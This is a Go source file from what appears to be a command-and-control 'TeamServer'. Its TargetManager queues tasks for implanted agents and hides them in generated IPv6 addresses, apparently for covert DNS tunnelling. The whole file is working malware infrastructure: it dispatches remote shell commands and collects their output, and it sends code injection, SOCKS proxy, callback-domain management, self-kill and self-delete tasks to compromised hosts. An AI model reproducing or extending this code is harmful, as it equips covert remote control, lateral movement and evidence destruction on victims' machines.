package core

import (
	"TeamServer/client"
	"TeamServer/debug"
	"TeamServer/macro"
	"TeamServer/support"
)

type TargetManager struct {
	Target        *macro.TargetInfo
	DomainName    string
	Data          string
	LastMessageID string
	RID           int64
}

func NewTargetManager(Target *macro.TargetInfo, Data string, RID int64, DomainName string) *TargetManager {
	var TargetM = new(TargetManager)
	TargetM.DomainName = DomainName
	TargetM.Data = Data
	TargetM.RID = RID
	TargetM.Target = Target
	return TargetM
}

//++++++++++++++++++++++++++++++++TASK MANAGER CORE+++++++++++++++++++++++++++++++++++

func (tm *TargetManager) CheckTasks() string {
	tm.Target.Lock()
	defer tm.Target.Unlock()
	if len(tm.Target.TaskContainer) > 0 {
		debug.Info("Sending New Task To [%s | %s]", tm.Target.TargetData.SessionID, tm.Target.TargetData.HostName)
		TaskType := tm.Target.TaskContainer[0].TaskType
		rand, _ := support.Randipv6Runes(16)
		rand = TaskType + rand[len(TaskType):]
		Ipv6 := support.GenerateIPv6(rand)
		return Ipv6

	} else {
		debug.Info("No Task Available For Session [%s | %s]", tm.Target.TargetData.SessionID, tm.Target.TargetData.HostName)
		rand, _ := support.Randipv6Runes(16)
		rand = macro.MacroNoTaskCodeTA + rand[len(macro.MacroNoTaskCodeTA):]
		Ipv6 := support.GenerateIPv6(rand)
		return Ipv6
	}

}

func (tm *TargetManager) getTask() string {

	if tm.Target.TaskContainer[0].IsFirstPart == true {
		go client.SendNewTaskSending(tm.Target.TargetData, tm.Target.TaskContainer[0].Size, tm.Target.TaskContainer[0].TaskID)
		tm.Target.TaskContainer[0].IsFirstPart = false
	}
	if tm.Target.TaskContainer[0].IsLastPart == false {
		tm.PrintSendProgress()
		NextSend := tm.Target.TaskContainer[0].Remaing
		Ipv6Buffer := tm.Target.TaskContainer[0].Task[NextSend]
		tm.Target.TaskContainer[0].Remaing++
		if tm.Target.TaskContainer[0].Remaing >= tm.Target.TaskContainer[0].Size {
			tm.Target.TaskContainer[0].IsLastPart = true
		}
		return Ipv6Buffer
	} else {
		tm.Target.TaskContainer = support.RemoveTask(tm.Target.TaskContainer, 0)
		debug.Info("Task Has Been Sent Successfully")
		debug.Info("Number Of Task Left To Send: [%d]", len(tm.Target.TaskContainer))
		return macro.MacroTaskBufferDoneCode

	}

}

func (tm *TargetManager) getTargetAndTaskType(data string, expectedTaskType string) (string, bool) {
	tm.Target.Lock()
	defer tm.Target.Unlock()
	if len(tm.Target.TaskContainer) == 0 {
		debug.Warn("No %s Task Available TaskContainer = [0]", expectedTaskType)
		return macro.MacroTaskNotFoundCode, false
	}

	TaskType := tm.Target.TaskContainer[0].TaskType
	if TaskType != expectedTaskType {
		debug.Warn("No [%s] Task Available", expectedTaskType)
		return macro.MacroTaskNotFoundCode, false
	}

	debug.Good("[%s] Task Found ", expectedTaskType)
	return tm.getTask(), true
}

func (tm *TargetManager) ResultNotifier(Type string) string {

	tm.ClearMessageContainer()
	tm.Target.MessageContainer.MessageType = Type
	tm.Target.ActiveMessage = true
	err := tm.setMessageSize()
	if err != nil {
		debug.Error("ResultNotifier - setMessageSize Error")
		randomIPv6()
	}
	return randomIPv6()
}

//++++++++++++++++++++++++++++++++SHELL COMMAND+++++++++++++++++++++++++++++++++++

func (tm *TargetManager) SendShellTask() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroShellCodeTA)
	return Ipv6Buffer
}

func (tm *TargetManager) GetShellResult() string {

	Ipv6 := tm.ResultNotifier(macro.MacroShellResultCodeAT)
	return Ipv6
}

func (tm *TargetManager) HandleShellResult() {
	tm.displayEncodedData()
	ShellResult := tm.ParsAndDecryptData()
	debug.Info("Shell Result: \n%s\n", ShellResult)
	client.SendPrintConsole(tm.Target.TargetData, ShellResult, macro.PrintConsoleShell)
	tm.ClearMessageContainer()
	return
}

func (tm *TargetManager) ShellResultRemaing() string {

	ReturnData, _ := tm.retrieveRemainingData(macro.MacroShellResultCodeAT)
	return ReturnData

}

//++++++++++++++++++++++++++++++++Inject COMMAND+++++++++++++++++++++++++++++++++++

func (tm *TargetManager) SendInjectTask() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroInjectCodeTA)
	return Ipv6Buffer
}

//++++++++++++++++++++++++++++++++Sleep COMMAND+++++++++++++++++++++++++++++++++++

func (tm *TargetManager) SendSleepTask() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroChangeSleepCodeTA)
	return Ipv6Buffer
}

//++++++++++++++++++++++++++++++++Self Kill & Wipe COMMAND+++++++++++++++++++++++++++++++++++

func (tm *TargetManager) SendSelfKillTask() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroKillTA)
	return Ipv6Buffer
}

//++++++++++++++++++++++++++++++++Self Del COMMAND+++++++++++++++++++++++++++++++++++

func (tm *TargetManager) SendSelfDelTask() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroSelfDelTA)
	return Ipv6Buffer
}

//++++++++++++++++++++++++++++++++Socks Proxy COMMAND+++++++++++++++++++++++++++++++++++

func (tm *TargetManager) SendStartSocksProxyTask() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroStartProxyCodeTA)
	return Ipv6Buffer
}

func (tm *TargetManager) SendStopSocksProxyTask() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroStopProxyCodeTA)
	return Ipv6Buffer
}

//++++++++++++++++++++++++++++++++New CallBack Domain COMMAND+++++++++++++++++++++++++++++++++++
func (tm *TargetManager) SendNewCallBackDoaminTask() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroNewCallBackDomainCodeTA)
	return Ipv6Buffer
}

func (tm *TargetManager) DeleteCallBackDomain() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroDeleteBackDomainCodeTA)
	return Ipv6Buffer
}

//Validation
func (tm *TargetManager) ValidateNewDomain() string {
	// no need to add more check but may in the future
	go client.SendConsoleSuccessful(tm.Target.TargetData, "New CallBack Domain Added Successfully to the Agent!")
	return macro.MacroDomainValidCode
}

func (tm *TargetManager) ValidateDeletedCallBackDomain() string {
	debug.Good("Domain CallBack Delete Successfully From Target [%s | %s]", tm.Target.TargetData.HostName, tm.Target.TargetData.SessionID)
	go client.SendConsoleSuccessful(tm.Target.TargetData, "New CallBack Domain Deleted Successfully From the Agent!")
	return randomIPv6()

}

func (tm *TargetManager) ListAllActiveDomains() string {
	Ipv6Buffer, _ := tm.getTargetAndTaskType(tm.Data, macro.MacroListAllActiveDomainCodeTA)
	return Ipv6Buffer
}
